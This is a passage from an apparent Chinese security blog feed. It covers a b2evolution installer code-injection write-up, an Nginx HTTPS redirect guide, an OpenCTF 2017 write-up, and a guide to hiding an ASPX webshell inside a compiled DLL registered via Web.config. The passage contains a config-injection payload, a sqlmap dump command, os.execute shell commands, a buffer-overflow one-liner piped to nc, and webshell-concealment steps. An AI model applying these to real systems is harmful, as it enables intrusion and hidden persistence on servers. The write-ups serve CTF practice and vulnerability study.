class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_password'</span>] ).<span class="string">"',\$2"</span></span><br><span class="line">.<span class="string">"\t'name'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_name'</span>] ).<span class="string">"',\$3"</span></span><br><span class="line">.<span class="string">"\t'host'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_host'</span>] ).<span class="string">"',\$4"</span>,</span><br><span class="line"><span class="string">"tableprefix = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'db_tableprefix'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">"baseurl = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'baseurl'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">"admin_email = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'admin_email'</span>] ).<span class="string">"';"</span>,</span><br><span class="line"><span class="string">'config_is_done = 1;'</span>,</span><br><span class="line">), $conf );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write new contents:</span></span><br><span class="line"><span class="keyword">if</span>( save_to_file( $conf, $conf_filepath, <span class="string">'w'</span> ) )</span><br><span class="line">&#123;</span><br><span class="line">display_install_messages( sprintf( T_(<span class="string">'Your configuration file &lt;code&gt;%s&lt;/code&gt; has been successfully created.'</span>).<span class="string">'&lt;/p&gt;'</span>, $conf_filepath ), <span class="string">'success'</span> );</span><br><span class="line"></span><br><span class="line">$tableprefix = $params[<span class="string">'db_tableprefix'</span>];</span><br><span class="line">$baseurl = $params[<span class="string">'baseurl'</span>];</span><br><span class="line">$admin_email = $params[<span class="string">'admin_email'</span>];</span><br><span class="line">$config_is_done = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>( ! $params[<span class="string">'quick_install'</span>] )</span><br><span class="line">&#123; <span class="comment">// Switch to menu only on standard installation:</span></span><br><span class="line">$action = <span class="string">'menu'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中针对baseurl的处理如下，即替换单引号<code>&#39;</code>为<code>\&#39;</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"baseurl = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'baseurl'</span>] ).<span class="string">"';"</span></span><br></pre></td></tr></table></figure><p>字符串baseurl处理后如下:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span>\\\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure></p><p>所以导致了单引号的逃逸，紧接着调用save_to_file存入/conf/_basic_config.php文件。</p><p>4.打开/conf/_basic_config.php文件内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$baseurl = <span class="string">'http://localhost/b2evolution/\\'</span>;phpinfo();<span class="comment">//';</span></span><br></pre></td></tr></table></figure></p><p>5.shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>这个漏洞需要在重装的时候才能利用，可以结合任意文件删除漏洞利用。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nginx配置HTTPS与http运维实践</title>
      <link href="/2017/11/29/nginx_http_https/"/>
      <url>/2017/11/29/nginx_http_https/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近采用Linux+Nginx+PHP+Mysql的方式搭建一个CodeIgniter框架的系统，需求为除了某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问。<br><a id="more"></a></p><h2 id="0x01系统搭建"><a href="#0x01系统搭建" class="headerlink" title="0x01系统搭建"></a>0x01系统搭建</h2><ul><li>服务器配置ubuntu+nginx+mysql+php5配置，参考链接：<a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-ubuntu-14-04" title="How To Install Linux, nginx, MySQL, PHP (LEMP) stack on Ubuntu 14.04 " target="_blank" rel="noopener">How To Install Linux, nginx, MySQL, PHP (LEMP) stack on Ubuntu 14.04</a></li><li>HTTPS配置，参考链接：<a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04" title="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04" target="_blank" rel="noopener">How To Secure Nginx with Let’s Encrypt on Ubuntu 14.04</a></li></ul><h2 id="0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置"><a href="#0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置" class="headerlink" title="0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置"></a>0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置</h2><ol><li><p>按照前面系统搭建过程安装并配置、选择采用全部重定向HTTPS的默认配置文件如下:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span> default_server ipv6only=<span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> 域名或IP地址;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/var/run/php5-fpm.sock;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> fullchain.pem文件路径; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> privkey.pem文件路径; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">include</span> /etc/letsencrypt/options-ssl-nginx.conf; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_dhparam</span> /etc/letsencrypt/ssl-dhparams.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125; <span class="comment"># managed by Certbot</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据需求添加对CodeIgniter框架的支持和某个特定URL采用HTTP访问，其余均强制采用HTTPS访问。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen [::]:80 default_server ipv6only=on;</span><br><span class="line"></span><br><span class="line">    root /usr/share/nginx/html;</span><br><span class="line">    index index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    server_name 域名;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /二级目录/ &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> /二级目录/index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> =404;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        fastcgi_pass unix:/var/run/php5-fpm.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        fastcgi_param   PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listen 443 ssl; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/域名/fullchain.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/域名/privkey.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line">    include /etc/letsencrypt/options-ssl-nginx.conf; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$flag</span> 0;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">        <span class="built_in">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span>) &#123;</span><br><span class="line">        <span class="built_in">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> = <span class="string">"012"</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> 301 https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>其中主要添加如下两处配置配置：</p><ul><li><p>对CodeIgniter框架的支持</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span>   PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br></pre></td></tr></table></figure></li><li><p>某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问添加的配置，由于Nginx的判断if条件不支持逻辑&amp;&amp;，需求的等价逻辑如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span> &amp;&amp; <span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span> )&#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>曲折的具体实现为：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> <span class="variable">$flag</span> <span class="number">0</span>;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>1"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span>) &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>2"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$flag</span> = <span class="string">"012"</span>) &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125; <span class="comment"># managed by Certbot</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>通常网络上关于NginxHTTPS配置主要有两种:HTTP和HTTPS同时存在或者所有HTTP强制转发HTTPS。然而项目需要特定URL支持HTTP访问，其余URL强制采用HTTPS，所有产生了本文。此外添加$scheme != “https”的判断是为了防止请求被循环重定向导致网页无法正常访问的问题，由于Nginx配置文件不支持逻辑与（and），采用等价的配置完成需要的功能。</p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Nginx </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISC极客嘉年华OpenCTF-2017Writeup</title>
      <link href="/2017/09/13/Openctf-2017/"/>
      <url>/2017/09/13/Openctf-2017/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这是一次很简单很简单的CTF,就当练练手吧……<br><a id="more"></a></p><h2 id="0x01-Writeup"><a href="#0x01-Writeup" class="headerlink" title="0x01 Writeup"></a>0x01 Writeup</h2><h3 id="1-WEB"><a href="#1-WEB" class="headerlink" title="1.WEB"></a>1.WEB</h3><h4 id="1-1-variacover"><a href="#1-1-variacover" class="headerlink" title="1.1 variacover"></a><strong>1.1 variacover</strong></h4><p>请求<code>http://202.112.51.184:8103/?id=a[0]=240610708</code><br>得到flag</p><pre><code>XCTF{sTr_covcderd_AND_you_kn0W?}</code></pre><h4 id="1-2-urldecode"><a href="#1-2-urldecode" class="headerlink" title="1.2 urldecode"></a><strong>1.2 urldecode</strong></h4><p>请求<code>http://202.112.51.184:8102?id=OPE%25%34%65CTF</code><br>得到flag</p><pre><code>XCTF{UrlDeCode_oL_yOu_lol!} </code></pre><h4 id="1-3-SQL注入"><a href="#1-3-SQL注入" class="headerlink" title="1.3 SQL注入"></a><strong>1.3 SQL注入</strong></h4><p>用sqlmap注入</p><pre><code>python sqlmap.py -u &quot;http://202.112.51.184:8201?id=1&quot; --dump -T &quot;flag&quot; -D &quot;security&quot;</code></pre><p>得到flag</p><pre><code>XCTF{ut9x2a5f8t9e6s3a4g5j}</code></pre><h4 id="1-4-jsjs"><a href="#1-4-jsjs" class="headerlink" title="1.4 jsjs"></a>1.4 jsjs</h4><p>由于禁用右键功能，使用Firefox的Web Developer插件查看源代码<br>得到flag</p><pre><code>XCTF{_O0oo0O_js_is_FUNNY!}</code></pre><h3 id="2-REVERSE"><a href="#2-REVERSE" class="headerlink" title="2.REVERSE"></a>2.REVERSE</h3><h4 id="OpenReverse"><a href="#OpenReverse" class="headerlink" title="OpenReverse"></a><strong>OpenReverse</strong></h4><p>下载文件，直接用notepade++打开，看到flag:</p><pre><code>XCTF{5eacs6y8p1o9gitc9521}</code></pre><h3 id="3-PWN"><a href="#3-PWN" class="headerlink" title="3.PWN"></a>3.PWN</h3><h4 id="3-1-getshell"><a href="#3-1-getshell" class="headerlink" title="3.1 getshell"></a><strong>3.1 getshell</strong></h4><p>参考 <a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/aul" target="_blank" rel="noopener">CSAW CTF 2016 aul (100) Writeup</a><br>在webshell中直接执行如下命令：<br>os.execute(“ls”)<br>os.execute(“cat flag”)<br>得到flag:</p><pre><code>XCTF{q0Cr1iwqlW*W1m8ejiK*0z9JUa1gq@n&amp;}</code></pre><h4 id="3-2-blind"><a href="#3-2-blind" class="headerlink" title="3.2 blind"></a><strong>3.2 blind</strong></h4><p>执行如下python程序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)'</span> | nc <span class="number">202.112</span><span class="number">.51</span><span class="number">.184</span> <span class="number">8301</span></span><br></pre></td></tr></table></figure></p><p>得到flag:</p><pre><code>XCTF{sQ^yeLZKBVkoZ7^zOtigV5xsepBY&amp;bB7}</code></pre><h3 id="4-MISC"><a href="#4-MISC" class="headerlink" title="4.MISC"></a>4.MISC</h3><h4 id="4-1-zip"><a href="#4-1-zip" class="headerlink" title="4.1 zip"></a><strong>4.1 zip</strong></h4><p>利用Advanced ZIP Password Recovery 4.0,选择纯数字爆破得到zip解密密码为88888888，<br>解压压缩包的flag:</p><pre><code>XCTF{ke&amp;cVR3OHWHx42ZygOceozE6KIxz1Zzj}</code></pre><h4 id="4-2-pcap"><a href="#4-2-pcap" class="headerlink" title="4.2 pcap"></a><strong>4.2 pcap</strong></h4><p>Wireshark追踪流得：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?q=XCTF%7BRSUJecDZ5xFp1z1X%26Nmpt%40PZSDQ%25Gbx6%7D</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: text/html, application/xhtml+xml, image/jxr, */*</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.1.115/</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-Hans-CN,zh-Hans;q=0.8,en-GB;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.115</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure></p><p>对参数q的值URLdecode后获得flag:</p><pre><code>XCTF{RSUJecDZ5xFp1z1X&amp;Nmpt@PZSDQ%Gbx6}</code></pre><h3 id="5-CRYPTO"><a href="#5-CRYPTO" class="headerlink" title="5.CRYPTO"></a>5.CRYPTO</h3><h4 id="5-1-Maya-Cipher"><a href="#5-1-Maya-Cipher" class="headerlink" title="5.1 Maya Cipher"></a><strong>5.1 Maya Cipher</strong></h4><p>百度搜索Maya numerals的编码规则如下：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Maya.svg/220px-Maya.svg.png" alt="Maya numerals"><br>得到<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">584354467</span>b</span><br><span class="line"><span class="number">323031385</span>f</span><br><span class="line"><span class="number">69735</span>f636f</span><br><span class="line"><span class="number">6</span>d696e677d</span><br></pre></td></tr></table></figure></p><p>每行对应16进制解码得flag:</p><pre><code>XCTF{2018_is_coming}</code></pre><h4 id="5-2-RSA"><a href="#5-2-RSA" class="headerlink" title="5.2 RSA"></a><strong>5.2 RSA</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = modinv(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">c= <span class="number">69016319356655639210194946570348715066396274579181987745484908846232464436640043461016746215950609916307004870722625663551955221548688400875709926061159609460224830151731941059363474236594094101209402353834752606848369320902191207004466087273869348206495061740962728586464640440980967989689860668335396868406</span></span><br><span class="line"></span><br><span class="line">m=pow(c,d,p*q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span></span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><p>flag:<br>554035859905981120888026046266284028688068004006280022208626</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ASPX编译dll隐藏shell&amp;Docker Remote API利用姿势</title>
      <link href="/2017/09/11/Dll-aspx&amp;docker/"/>
      <url>/2017/09/11/Dll-aspx&amp;docker/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这是很久之前的一次内部分享，整理后分享出来。<br><a id="more"></a></p><h2 id="0x01-ASPX编译Dll隐藏shell"><a href="#0x01-ASPX编译Dll隐藏shell" class="headerlink" title="0x01 ASPX编译Dll隐藏shell"></a>0x01 ASPX编译Dll隐藏shell</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>ASPX木马（copy到一个单独的文件夹,aabb.aspx为例）</li><li>aspnet_compiler.exe(安装了Microsoft .net framework后不同版本均带有此软件，2.0版默认在<code>C:\Windows\Microsoft.NET\Framework\v2.0.50727）</code></li><li>新建目标文件夹（Dll生成的位置，target为例）</li><li>ASPX运行解析环境（最好IIS,本次以PageAdmin携带的AspNet.EXE便携版解析环境为例）</li></ol><h3 id="ASPX编译Dll"><a href="#ASPX编译Dll" class="headerlink" title="ASPX编译Dll"></a>ASPX编译Dll</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aspnet_compiler.exe  -v / -p ASPX木马绝对路径 target目标文件绝对路径</span><br><span class="line">例如：aspnet_compiler.exe -v / -p C:\Users\test\Desktop\zhou4\aspx_shell\test\ C:\Users\test\Desktop\zhou4\aspx_shell\target</span><br></pre></td></tr></table></figure><p>命令执行完毕后，在target目标文件夹下的bin目录生成对应Dll文件和一些其他文件</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>使用我所提到的环境编译的情况下，处于功能测试目的，直接运行target目标文件夹下的AspNet.exe即可运行，浏览器访问对应的木马文件名，如aabb.aspx即可正常访问shell木马。<br><strong>然而打开aabb.aspx文件发现并没有实际内容，将其删除对木马功能没有任何影响</strong></p><h3 id="渗透实际环境"><a href="#渗透实际环境" class="headerlink" title="渗透实际环境"></a>渗透实际环境</h3><ol><li>打开编译target目录下bin/*.compiled文件,记录其中assembly（dll文件名和type的值（类名）（此处assembly=”App_Web_gsaqzno3” type=”ASP.aabb_aspx”）</li><li><p>编辑目标主机网站目录的Web.config文件，在<code>&lt;add verb</code>代码附近添加如下代码：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"木马最终访问路径"</span> <span class="built_in">type</span>=<span class="string">"type的值（类名），assembly的值（dll文件名）"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">例如：</span><br><span class="line">&lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"aabb.aspx"</span> <span class="built_in">type</span>=<span class="string">"ASP.aabb_aspx,App_Web_amovoubm"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">如果没有&lt;<span class="built_in">add</span> <span class="keyword">verb</span></span><br><span class="line">在</span><br><span class="line">&lt;<span 